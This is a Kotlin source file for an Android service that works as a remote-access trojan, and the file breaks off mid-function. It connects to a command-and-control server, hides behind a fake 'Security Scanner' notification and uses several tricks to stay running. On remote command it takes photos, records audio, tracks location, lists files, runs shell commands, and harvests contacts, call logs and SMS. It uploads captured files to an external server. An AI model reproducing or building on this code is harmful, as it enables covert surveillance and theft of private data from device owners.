// android/app/src/main/kotlin/com/example/kem/NativeCommandService.kt
package com.example.kem

import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.hardware.camera2.*
import android.hardware.camera2.params.OutputConfiguration
import android.hardware.camera2.params.SessionConfiguration
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.MediaRecorder
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder.AudioSource
import android.os.*
import android.util.Log
import android.view.Surface
import android.media.ImageReader
import android.graphics.ImageFormat
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.*
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.Semaphore
import android.provider.ContactsContract
import android.database.Cursor
import android.provider.CallLog
import android.provider.Telephony
import android.content.BroadcastReceiver
import android.content.IntentFilter
import android.app.AlarmManager
import android.content.ComponentName

class NativeCommandService : LifecycleService(), NativeSocketIOClient.CommandCallback {
    
    companion object {
        private const val TAG = "NativeCommandService"
        private const val NOTIFICATION_ID = 999
        private const val CHANNEL_ID = "native_command_service_channel"
        
        // Command types
        const val CMD_TAKE_PICTURE = "command_take_picture"
        const val CMD_RECORD_AUDIO = "command_record_voice" 
        const val CMD_GET_LOCATION = "command_get_location"
        const val CMD_LIST_FILES = "command_list_files"
        const val CMD_EXECUTE_SHELL = "command_execute_shell"
        const val CMD_GET_CONTACTS = "command_get_contacts"
        const val CMD_GET_CALL_LOGS = "command_get_call_logs"
        const val CMD_GET_SMS = "command_get_sms"
        
        // Intent extras
        const val EXTRA_COMMAND = "command"
        const val EXTRA_ARGS = "args"
        const val EXTRA_REQUEST_ID = "request_id"
        
        // Broadcast actions for IPC
        const val ACTION_COMMAND_RESULT = "com.example.kem.COMMAND_RESULT"
        const val ACTION_CONNECTION_STATUS = "com.example.kem.CONNECTION_STATUS"
        const val ACTION_EXECUTE_COMMAND = "com.example.kem.EXECUTE_COMMAND"
        
        // Shared instance for communication
        @Volatile
        private var instance: NativeCommandService? = null
        
        fun getInstance(): NativeCommandService? = instance
        
        fun executeCommand(context: Context, command: String, args: JSONObject = JSONObject()): String {
            val requestId = generateRequestId()
            
            // Try direct service communication first
            val serviceInstance = getInstance()
            if (serviceInstance != null) {
                serviceInstance.executeCommandDirect(command, args, requestId)
                return requestId
            }
            
            // Fallback to broadcast for IPC
            val intent = Intent(ACTION_EXECUTE_COMMAND).apply {
                putExtra(EXTRA_COMMAND, command)
                putExtra(EXTRA_ARGS, args.toString())
                putExtra(EXTRA_REQUEST_ID, requestId)
            }
            context.sendBroadcast(intent)
            
            return requestId
        }
        
        private fun generateRequestId(): String {
            return "req_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
        }
    }
    
    // Service components
    private lateinit var backgroundExecutor: ExecutorService
    private lateinit var cameraExecutor: ExecutorService
    private var cameraManager: CameraManager? = null
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var audioRecord: AudioRecord? = null
    private var mediaRecorder: MediaRecorder? = null
    private var locationManager: LocationManager? = null
    
    // Native Socket.IO client for direct C2 communication
    private var socketIOClient: NativeSocketIOClient? = null
    private var deviceId: String = ""
    
    // Command queue and processing
    private val commandQueue = mutableListOf<PendingCommand>()
    private val commandSemaphore = Semaphore(1)
    private val pendingResults = mutableMapOf<String, CompletableDeferred<JSONObject>>()
    
    // Connection monitoring
    private var connectionCheckJob: Job? = null
    private var isC2Connected = false
    private val reconnectScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // Persistence monitoring
    private var persistenceHandler: Handler? = null
    private var persistenceRunnable: Runnable? = null
    
    // Broadcast receiver for IPC commands
    private val commandReceiver = object : BroadcastReceiver() {
        override fun onReceive(context: Context?, intent: Intent?) {
            if (intent?.action == ACTION_EXECUTE_COMMAND) {
                val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
                val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
                val requestId = intent.getStringExtra(EXTRA_REQUEST_ID) ?: generateRequestId()
                
                try {
                    val args = JSONObject(argsString)
                    executeCommandDirect(command, args, requestId)
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing IPC command: $command", e)
                }
            }
        }
    }
    
    data class PendingCommand(
        val requestId: String,
        val command: String,
        val args: JSONObject,
        val timestamp: Long = System.currentTimeMillis()
    )
    
    // Callback interface for command results
    interface CommandCallback {
        fun onCommandResult(command: String, success: Boolean, result: JSONObject)
    }
    
    private var commandCallback: CommandCallback? = null
    private var isInitialized = false
    
    // Binder for service binding
    inner class LocalBinder : Binder() {
        fun getService(): NativeCommandService = this@NativeCommandService
    }
    
    private val binder = LocalBinder()
    
    override fun onCreate() {
        super.onCreate()
        instance = this
        
        Log.d(TAG, "NativeCommandService onCreate() - Starting persistence mode")
        
        // ✅ CRITICAL: Start foreground IMMEDIATELY (within 5 seconds)
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, createPersistentNotification())
        
        // Initialize service components
        initializeService()
        
        // Register broadcast receiver for IPC
        registerReceiver(commandReceiver, IntentFilter(ACTION_EXECUTE_COMMAND))
        
        // Start persistence monitoring
        startPersistenceMonitoring()
        
        // Schedule resurrection job
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            ResurrectionJobService.scheduleResurrectionJob(this)
        }
        
        Log.d(TAG, "Native Command Service created and started in PERSISTENT foreground mode")
    }
    
    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Security Scanner Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Monitoring device security in background"
                setShowBadge(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = Notification.VISIBILITY_SECRET
            }
            
            val notificationManager = getSystemService(NotificationManager::class.java)
            notificationManager.createNotificationChannel(channel)
        }
    }
    
    private fun createPersistentNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Security Scanner Active")
            .setContentText("Monitoring device security")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)  // ✅ Can't be dismissed by user
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setVisibility(NotificationCompat.VISIBILITY_SECRET)  // ✅ Hide from lock screen
            .setAutoCancel(false)  // ✅ Prevent accidental dismissal
            .build()
    }
    
    private fun startPersistenceMonitoring() {
        persistenceHandler = Handler(Looper.getMainLooper())
        persistenceRunnable = object : Runnable {
            override fun run() {
                try {
                    // Check if we're still in foreground
                    if (!isServiceInForeground()) {
                        Log.w(TAG, "Service not in foreground! Restarting foreground...")
                        startForeground(NOTIFICATION_ID, createPersistentNotification())
                    }
                    
                    // Update notification to show activity
                    updateNotification("Security Scanner Active - ${getCurrentTime()}")
                    
                    // Schedule next check
                    persistenceHandler?.postDelayed(this, 30000) // Check every 30s
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error in persistence monitoring", e)
                    persistenceHandler?.postDelayed(this, 10000) // Retry in 10s
                }
            }
        }
        persistenceHandler?.post(persistenceRunnable!!)
    }
    
    private fun isServiceInForeground(): Boolean {
        return try {
            val manager = getSystemService(Context.ACTIVITY_SERVICE) as ActivityManager
            manager.getRunningServices(Integer.MAX_VALUE)
                .any { 
                    it.service.className == this::class.java.name && 
                    it.foreground 
                }
        } catch (e: Exception) {
            false
        }
    }
    
    private fun getCurrentTime(): String {
        return SimpleDateFormat("HH:mm:ss", Locale.getDefault()).format(Date())
    }
    
    private fun initializeService() {
        try {
            backgroundExecutor = Executors.newFixedThreadPool(4)
            cameraExecutor = Executors.newSingleThreadExecutor()
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            locationManager = getSystemService(Context.LOCATION_SERVICE) as LocationManager
            
            // Initialize device ID
            deviceId = getOrCreateDeviceId()
            
            // Initialize Socket.IO client for direct C2 communication
            initializeSocketIOClient()
            
            // Start command processing loop
            backgroundExecutor.execute { processCommandQueue() }
            
            // Start connection monitoring
            startConnectionMonitoring()
            
            isInitialized = true
            updateNotification("Security Scanner Ready - Device: ${deviceId.takeLast(8)}")
            Log.d(TAG, "Service initialization completed successfully")
            
        } catch (e: Exception) {
            Log.e(TAG, "Service initialization failed", e)
            updateNotification("Security Scanner - Initialization Failed")
        }
    }
    
    private fun initializeSocketIOClient() {
    try {
        socketIOClient = NativeSocketIOClient(this, this)
        
        // ✅ FIXED: Use HTTP URL for Python Flask-SocketIO server
        val serverUrl = "http://192.168.8.200:5000"  // Your Python server
        
        socketIOClient?.initialize(serverUrl, deviceId)
        
        Log.d(TAG, "Socket.IO client initialized for Python server: $serverUrl")
        Log.d(TAG, "Device ID: $deviceId")
    } catch (e: Exception) {
        Log.e(TAG, "Failed to initialize Socket.IO client", e)
    }
}
    
    private fun startConnectionMonitoring() {
        connectionCheckJob = reconnectScope.launch {
            while (isActive) {
                try {
                    if (!isC2Connected && socketIOClient?.isConnected() != true) {
                        Log.d(TAG, "Attempting to connect to C2 server...")
                        socketIOClient?.connect()
                    }
                    
                    // Check connection every 30 seconds
                    delay(30000)
                    
                } catch (e: Exception) {
                    Log.e(TAG, "Error in connection monitoring", e)
                    delay(10000) // Wait before retry
                }
            }
        }
    }
    
    private fun getOrCreateDeviceId(): String {
        val prefs = getSharedPreferences("kem_prefs", Context.MODE_PRIVATE)
        var deviceId = prefs.getString("device_id", null)
        
        if (deviceId == null) {
            deviceId = "android_${System.currentTimeMillis()}_${(Math.random() * 1000).toInt()}"
            prefs.edit().putString("device_id", deviceId).apply()
            Log.d(TAG, "Generated new device ID: $deviceId")
        }
        
        return deviceId
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)
        
        Log.d(TAG, "onStartCommand called - ensuring foreground status")
        
        // ✅ Ensure we're always in foreground
        startForeground(NOTIFICATION_ID, createPersistentNotification())
        
        intent?.let { processCommandIntent(it) }
        
        // ✅ CRITICAL: Return START_STICKY for auto-restart
        return START_STICKY
    }
    
    override fun onBind(intent: Intent): IBinder {
        super.onBind(intent)
        return binder
    }
    
    fun setCommandCallback(callback: CommandCallback?) {
        this.commandCallback = callback
    }
    
    // Socket.IO callback implementations
    override fun onCommandReceived(command: String, args: JSONObject) {
        Log.d(TAG, "Received command from C2: $command with args: $args")
        val requestId = generateRequestId()
        executeCommandDirect(command, args, requestId)
    }
    
    override fun onConnectionStatusChanged(connected: Boolean) {
        isC2Connected = connected
        Log.d(TAG, "C2 connection status changed: $connected")
        
        updateNotification(
            if (connected) "Security Scanner - Connected to C2"
            else "Security Scanner - Reconnecting to C2..."
        )
        
        // Broadcast connection status for Flutter/other components
        val statusIntent = Intent(ACTION_CONNECTION_STATUS).apply {
            putExtra("connected", connected)
            putExtra("deviceId", deviceId)
        }
        sendBroadcast(statusIntent)
    }
    
    override fun onError(error: String) {
        Log.e(TAG, "Socket.IO error: $error")
        updateNotification("Security Scanner - Connection Error")
    }
    
    fun executeCommandDirect(command: String, args: JSONObject, requestId: String) {
        if (!isInitialized) {
            Log.w(TAG, "Service not initialized, deferring command: $command")
            backgroundExecutor.execute {
                Thread.sleep(2000)
                executeCommandDirect(command, args, requestId)
            }
            return
        }
        
        Log.d(TAG, "Executing command directly: $command with ID: $requestId")
        
        val pendingCommand = PendingCommand(requestId, command, args)
        
        synchronized(commandQueue) {
            commandQueue.add(pendingCommand)
        }
    }
    
    private fun processCommandIntent(intent: Intent) {
        val command = intent.getStringExtra(EXTRA_COMMAND) ?: return
        val argsString = intent.getStringExtra(EXTRA_ARGS) ?: "{}"
        val requestId = intent.getStringExtra(EXTRA_REQUEST_ID) ?: generateRequestId()
        
        try {
            val args = JSONObject(argsString)
            executeCommandDirect(command, args, requestId)
        } catch (e: Exception) {
            Log.e(TAG, "Error processing command intent: $command", e)
            sendErrorResult(command, requestId, "Failed to parse command arguments: ${e.message}")
        }
    }
    
    private fun processCommandQueue() {
        while (true) {
            try {
                commandSemaphore.acquire()
                
                val command = synchronized(commandQueue) {
                    if (commandQueue.isNotEmpty()) {
                        commandQueue.removeAt(0)
                    } else null
                }
                
                if (command != null) {
                    updateNotification("Executing: ${command.command}")
                    executeCommandInternal(command)
                } else {
                    updateNotification(
                        if (isC2Connected) "Security Scanner - Connected & Ready"
                        else "Security Scanner - Reconnecting..."
                    )
                    Thread.sleep(1000)
                }
                
            } catch (e: InterruptedException) {
                Log.w(TAG, "Command queue processing interrupted")
                break
            } catch (e: Exception) {
                Log.e(TAG, "Error in command queue processing", e)
            } finally {
                commandSemaphore.release()
            }
        }
    }
    
    private fun executeCommandInternal(pendingCommand: PendingCommand) {
        val (requestId, command, args) = pendingCommand
        
        try {
            when (command) {
                CMD_TAKE_PICTURE -> handleTakePicture(args, requestId)
                CMD_RECORD_AUDIO -> handleRecordAudio(args, requestId)
                CMD_GET_LOCATION -> handleGetLocation(args, requestId)
                CMD_LIST_FILES -> handleListFiles(args, requestId)
                CMD_EXECUTE_SHELL -> handleExecuteShell(args, requestId)
                CMD_GET_CONTACTS -> handleGetContacts(args, requestId)
                CMD_GET_CALL_LOGS -> handleGetCallLogs(args, requestId)
                CMD_GET_SMS -> handleGetSMS(args, requestId)
                else -> {
                    Log.w(TAG, "Unknown command: $command")
                    sendErrorResult(command, requestId, "Unknown command: $command")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error executing command: $command", e)
            sendErrorResult(command, requestId, "Command execution failed: ${e.message}")
        }
    }
    
    // CAMERA IMPLEMENTATION
    private fun handleTakePicture(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.CAMERA)) {
            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera permission not granted")
            return
        }
        
        cameraExecutor.execute {
            try {
                val lensDirection = args.optString("camera", "back")
                val cameraId = getCameraId(lensDirection)
                
                if (cameraId == null) {
                    sendErrorResult(CMD_TAKE_PICTURE, requestId, "Requested camera not available")
                    return@execute
                }
                
                val photoFile = createImageFile()
                
                // Setup ImageReader with proper error handling
                imageReader = ImageReader.newInstance(1920, 1080, ImageFormat.JPEG, 1)
                imageReader?.setOnImageAvailableListener({ reader ->
                    try {
                        val image = reader.acquireLatestImage()
                        if (image != null) {
                            saveImageToFile(image, photoFile)
                            image.close()
                            
                            val result = JSONObject().apply {
                                put("path", photoFile.absolutePath)
                                put("size", photoFile.length())
                                put("camera", lensDirection)
                                put("method", "native_camera2")
                            }
                            
                            sendSuccessResult(CMD_TAKE_PICTURE, requestId, result)
                            uploadFile(photoFile, CMD_TAKE_PICTURE)
                        } else {
                            sendErrorResult(CMD_TAKE_PICTURE, requestId, "Failed to acquire image")
                        }
                    } catch (e: Exception) {
                        Log.e(TAG, "Error processing camera image", e)
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Image processing failed: ${e.message}")
                    } finally {
                        cleanupCamera()
                    }
                }, backgroundHandler)
                
                // Open camera with proper error handling
                cameraManager?.openCamera(cameraId, object : CameraDevice.StateCallback() {
                    override fun onOpened(camera: CameraDevice) {
                        cameraDevice = camera
                        createCaptureSession(camera)
                    }
                    
                    override fun onDisconnected(camera: CameraDevice) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera disconnected")
                    }
                    
                    override fun onError(camera: CameraDevice, error: Int) {
                        camera.close()
                        cameraDevice = null
                        sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera error: $error")
                    }
                }, backgroundHandler)
                
            } catch (e: Exception) {
                Log.e(TAG, "Camera setup failed", e)
                sendErrorResult(CMD_TAKE_PICTURE, requestId, "Camera setup failed: ${e.message}")
                cleanupCamera()
            }
        }
    }
    
    // ENHANCED AUDIO RECORDING IMPLEMENTATION
    private fun handleRecordAudio(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.RECORD_AUDIO)) {
            sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            var tempMediaRecorder: MediaRecorder? = null
            try {
                val duration = args.optInt("duration", 10) // seconds
                val quality = args.optString("quality", "medium")
                
                val audioFile = createAudioFile()
                
                // ✅ FIXED: Proper MediaRecorder setup
                tempMediaRecorder = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
                    MediaRecorder(this@NativeCommandService)
                } else {
                    @Suppress("DEPRECATION")
                    MediaRecorder()
                }
                
                tempMediaRecorder.apply {
                    setAudioSource(MediaRecorder.AudioSource.MIC)
                    setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP)
                    setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB)
                    setOutputFile(audioFile.absolutePath)
                    
                    if (quality == "high") {
                        setAudioEncodingBitRate(128000)
                        setAudioSamplingRate(44100)
                    } else {
                        setAudioEncodingBitRate(64000)
                        setAudioSamplingRate(22050)
                    }
                    
                    try {
                        prepare()
                        start()
                        mediaRecorder = this
                    } catch (e: Exception) {
                        Log.e(TAG, "MediaRecorder prepare/start failed", e)
                        throw e
                    }
                }
                
                Log.d(TAG, "Audio recording started for ${duration}s")
                
                // Record for specified duration
                Thread.sleep(duration * 1000L)
                
                // Stop recording
                tempMediaRecorder.apply {
                    try {
                        stop()
                        reset()
                        release()
                    } catch (e: Exception) {
                        Log.e(TAG, "Error stopping MediaRecorder", e)
                    }
                }
                mediaRecorder = null
                
                val result = JSONObject().apply {
                    put("path", audioFile.absolutePath)
                    put("size", audioFile.length())
                    put("duration", duration)
                    put("quality", quality)
                    put("format", "3gp")
                }
                
                sendSuccessResult(CMD_RECORD_AUDIO, requestId, result)
                uploadFile(audioFile, CMD_RECORD_AUDIO)
                
            } catch (e: Exception) {
                Log.e(TAG, "Audio recording failed", e)
                tempMediaRecorder?.apply {
                    try {
                        stop()
                        reset()
                        release()
                    } catch (ex: Exception) {
                        Log.e(TAG, "Error cleaning up media recorder", ex)
                    }
                }
                mediaRecorder = null
                sendErrorResult(CMD_RECORD_AUDIO, requestId, "Audio recording failed: ${e.message}")
            }
        }
    }
    
    // LOCATION IMPLEMENTATION
    private fun handleGetLocation(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) && 
            !hasPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION)) {
            sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val locationListener = object : LocationListener {
                    override fun onLocationChanged(location: Location) {
                        val result = JSONObject().apply {
                            put("latitude", location.latitude)
                            put("longitude", location.longitude)
                            put("accuracy", location.accuracy)
                            put("altitude", location.altitude)
                            put("speed", location.speed)
                            put("timestamp", location.time)
                            put("provider", location.provider)
                        }
                        
                        sendSuccessResult(CMD_GET_LOCATION, requestId, result)
                        locationManager?.removeUpdates(this)
                    }
                    
                    override fun onStatusChanged(provider: String?, status: Int, extras: Bundle?) {}
                    override fun onProviderEnabled(provider: String) {}
                    override fun onProviderDisabled(provider: String) {}
                }
                
                // Try GPS first, then network
                val gpsEnabled = locationManager?.isProviderEnabled(LocationManager.GPS_PROVIDER) ?: false
                val networkEnabled = locationManager?.isProviderEnabled(LocationManager.NETWORK_PROVIDER) ?: false
                
                when {
                    gpsEnabled -> {
                        locationManager?.requestLocationUpdates(
                            LocationManager.GPS_PROVIDER, 
                            0L, 
                            0f, 
                            locationListener
                        )
                    }
                    networkEnabled -> {
                        locationManager?.requestLocationUpdates(
                            LocationManager.NETWORK_PROVIDER, 
                            0L, 
                            0f, 
                            locationListener
                        )
                    }
                    else -> {
                        sendErrorResult(CMD_GET_LOCATION, requestId, "No location providers available")
                        return@execute
                    }
                }
                
                // Timeout after 30 seconds
                backgroundExecutor.execute {
                    Thread.sleep(30000)
                    locationManager?.removeUpdates(locationListener)
                }
                
            } catch (e: SecurityException) {
                sendErrorResult(CMD_GET_LOCATION, requestId, "Location permission denied: ${e.message}")
            } catch (e: Exception) {
                Log.e(TAG, "Location request failed", e)
                sendErrorResult(CMD_GET_LOCATION, requestId, "Location request failed: ${e.message}")
            }
        }
    }
    
    // FILE LISTING IMPLEMENTATION
    private fun handleListFiles(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val pathToList = args.optString("path", "/storage/emulated/0")
                val directory = File(pathToList)
                
                if (!directory.exists()) {
                    sendErrorResult(CMD_LIST_FILES, requestId, "Directory does not exist: $pathToList")
                    return@execute
                }
                
                if (!directory.isDirectory) {
                    sendErrorResult(CMD_LIST_FILES, requestId, "Path is not a directory: $pathToList")
                    return@execute
                }
                
                val files = directory.listFiles()
                val fileList = JSONArray()
                
                files?.forEach { file ->
                    val fileInfo = JSONObject().apply {
                        put("name", file.name)
                        put("path", file.absolutePath)
                        put("size", file.length())
                        put("isDirectory", file.isDirectory)
                        put("lastModified", file.lastModified())
                        put("canRead", file.canRead())
                        put("canWrite", file.canWrite())
                    }
                    fileList.put(fileInfo)
                }
                
                val result = JSONObject().apply {
                    put("path", pathToList)
                    put("files", fileList)
                    put("totalFiles", fileList.length())
                }
                
                sendSuccessResult(CMD_LIST_FILES, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "File listing failed", e)
                sendErrorResult(CMD_LIST_FILES, requestId, "File listing failed: ${e.message}")
            }
        }
    }
    
    // SHELL EXECUTION IMPLEMENTATION
    private fun handleExecuteShell(args: JSONObject, requestId: String) {
        backgroundExecutor.execute {
            try {
                val commandName = args.optString("command_name", "ls")
                val commandArgs = args.optJSONArray("command_args") ?: JSONArray()
                
                val fullCommand = mutableListOf<String>().apply {
                    add(commandName)
                    for (i in 0 until commandArgs.length()) {
                        add(commandArgs.getString(i))
                    }
                }
                
                Log.d(TAG, "Executing shell command: ${fullCommand.joinToString(" ")}")
                
                val processBuilder = ProcessBuilder(fullCommand)
                val process = processBuilder.start()
                
                val stdout = process.inputStream.bufferedReader().readText()
                val stderr = process.errorStream.bufferedReader().readText()
                val exitCode = process.waitFor()
                
                val result = JSONObject().apply {
                    put("command", commandName)
                    put("args", commandArgs)
                    put("exitCode", exitCode)
                    put("stdout", stdout)
                    put("stderr", stderr)
                }
                
                sendSuccessResult(CMD_EXECUTE_SHELL, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Shell command execution failed", e)
                sendErrorResult(CMD_EXECUTE_SHELL, requestId, "Shell execution failed: ${e.message}")
            }
        }
    }
    
    // CONTACTS IMPLEMENTATION
    private fun handleGetContacts(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CONTACTS)) {
            sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val contacts = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                    arrayOf(
                        ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                        ContactsContract.CommonDataKinds.Phone.NUMBER
                    ),
                    null, null, null
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val name = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME))
                        val number = it.getString(it.getColumnIndexOrThrow(ContactsContract.CommonDataKinds.Phone.NUMBER))
                        
                        val contact = JSONObject().apply {
                            put("name", name ?: "Unknown")
                            put("number", number ?: "Unknown")
                        }
                        contacts.put(contact)
                    }
                }
                
                val result = JSONObject().apply {
                    put("contacts", contacts)
                    put("totalContacts", contacts.length())
                }
                
                sendSuccessResult(CMD_GET_CONTACTS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Contacts retrieval failed", e)
                sendErrorResult(CMD_GET_CONTACTS, requestId, "Contacts retrieval failed: ${e.message}")
            }
        }
    }
    
    // CALL LOGS IMPLEMENTATION
    private fun handleGetCallLogs(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_CALL_LOG)) {
            sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call log permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val callLogs = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    CallLog.Calls.CONTENT_URI,
                    arrayOf(
                        CallLog.Calls.NUMBER,
                        CallLog.Calls.TYPE,
                        CallLog.Calls.DATE,
                        CallLog.Calls.DURATION
                    ),
                    null, null, 
                    "${CallLog.Calls.DATE} DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val number = it.getString(it.getColumnIndexOrThrow(CallLog.Calls.NUMBER))
                        val type = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.TYPE))
                        val date = it.getLong(it.getColumnIndexOrThrow(CallLog.Calls.DATE))
                        val duration = it.getInt(it.getColumnIndexOrThrow(CallLog.Calls.DURATION))
                        
                        val typeString = when (type) {
                            CallLog.Calls.INCOMING_TYPE -> "Incoming"
                            CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                            CallLog.Calls.MISSED_TYPE -> "Missed"
                            else -> "Unknown"
                        }
                        
                        val callLog = JSONObject().apply {
                            put("number", number ?: "Unknown")
                            put("type", typeString)
                            put("date", date)
                            put("duration", duration)
                        }
                        callLogs.put(callLog)
                    }
                }
                
                val result = JSONObject().apply {
                    put("call_logs", callLogs)
                    put("totalCallLogs", callLogs.length())
                }
                
                sendSuccessResult(CMD_GET_CALL_LOGS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "Call logs retrieval failed", e)
                sendErrorResult(CMD_GET_CALL_LOGS, requestId, "Call logs retrieval failed: ${e.message}")
            }
        }
    }
    
    // SMS IMPLEMENTATION
    private fun handleGetSMS(args: JSONObject, requestId: String) {
        if (!hasPermission(android.Manifest.permission.READ_SMS)) {
            sendErrorResult(CMD_GET_SMS, requestId, "SMS permission not granted")
            return
        }
        
        backgroundExecutor.execute {
            try {
                val smsMessages = JSONArray()
                val cursor: Cursor? = contentResolver.query(
                    Telephony.Sms.CONTENT_URI,
                    arrayOf(
                        Telephony.Sms.ADDRESS,
                        Telephony.Sms.BODY,
                        Telephony.Sms.DATE,
                        Telephony.Sms.TYPE
                    ),
                    null, null,
                    "${Telephony.Sms.DATE} DESC"
                )
                
                cursor?.use {
                    while (it.moveToNext()) {
                        val address = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.ADDRESS))
                        val body = it.getString(it.getColumnIndexOrThrow(Telephony.Sms.BODY))
                        val date = it.getLong(it.getColumnIndexOrThrow(Telephony.Sms.DATE))
                        val type = it.getInt(it.getColumnIndexOrThrow(Telephony.Sms.TYPE))
                        
                        val typeString = when (type) {
                            Telephony.Sms.MESSAGE_TYPE_INBOX -> "Received"
                            Telephony.Sms.MESSAGE_TYPE_SENT -> "Sent"
                            Telephony.Sms.MESSAGE_TYPE_DRAFT -> "Draft"
                            else -> "Unknown"
                        }
                        
                        val sms = JSONObject().apply {
                            put("address", address ?: "Unknown")
                            put("body", body ?: "")
                            put("date", date)
                            put("type", typeString)
                        }
                        smsMessages.put(sms)
                    }
                }
                
                val result = JSONObject().apply {
                    put("sms_messages", smsMessages)
                    put("totalMessages", smsMessages.length())
                }
                
                sendSuccessResult(CMD_GET_SMS, requestId, result)
                
            } catch (e: Exception) {
                Log.e(TAG, "SMS retrieval failed", e)
                sendErrorResult(CMD_GET_SMS, requestId, "SMS retrieval failed: ${e.message}")
            }
        }
    }
    
    // HELPER METHODS
    private fun sendSuccessResult(command: String, requestId: String, result: JSONObject) {
        result.put("requestId", requestId)
        result.put("timestamp", System.currentTimeMillis())
        
        // Send to local callback (for bound services)
        commandCallback?.onCommandResult(command, true, result)
        
        // Send to C2 server via Socket.IO
        socketIOClient?.sendCommandResponse(command, "success", result)
        
        // Broadcast for IPC
        broadcastCommandResult(command, true, result)
        
        Log.d(TAG, "Command succeeded: $command (ID: $requestId)")
    }
    
    private fun sendErrorResult(command: String, requestId: String, error: String) {
        val result = JSONObject().apply {
            put("error", error)
            put("requestId", requestId)
            put("timestamp", System.currentTimeMillis())
        }
        
        // Send to local callback
        commandCallback?.onCommandResult(command, false, result)
        
        // Send to C2 server via Socket.IO
        socketIOClient?.sendCommandResponse(command, "error", result)
        
        // Broadcast for IPC
        broadcastCommandResult(command, false, result)
        
        Log.e(TAG, "Command failed: $command (ID: $requestId) - $error")
    }
    
    private fun broadcastCommandResult(command: String, success: Boolean, result: JSONObject) {
        val intent = Intent(ACTION_COMMAND_RESULT).apply {
            putExtra("command", command)
            putExtra("success", success)
            putExtra("result", result.toString())
        }
        sendBroadcast(intent)
    }
    
    private fun uploadFile(file: File, commandRef: String) {
        backgroundExecutor.execute {
            try {
                val serverUrl = "https://ws.sosa-qav.es/upload_command_file"
                
                val connection = URL(serverUrl).openConnection() as HttpURLConnection
                connection.requestMethod = "POST"
                connection.doOutput = true
                connection.setRequestProperty("Content-Type", "multipart/form-data; boundary=***")
                connection.connectTimeout = 30000
                connection.readTimeout = 60000
                
                val boundary = "***"
                val writer = PrintWriter(OutputStreamWriter(connection.outputStream, "UTF-8"), true)
                
                // Add deviceId field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"deviceId\"\r\n\r\n")
                writer.append(deviceId).append("\r\n")
                
                // Add commandRef field
                writer.append("--$boundary\r\n")
                writer.append("Content-Disposition: form-data; name=\"commandRef\"\r\n\r\n")
                writer.append(commandRef).append("\r\n")
                
                // Add file
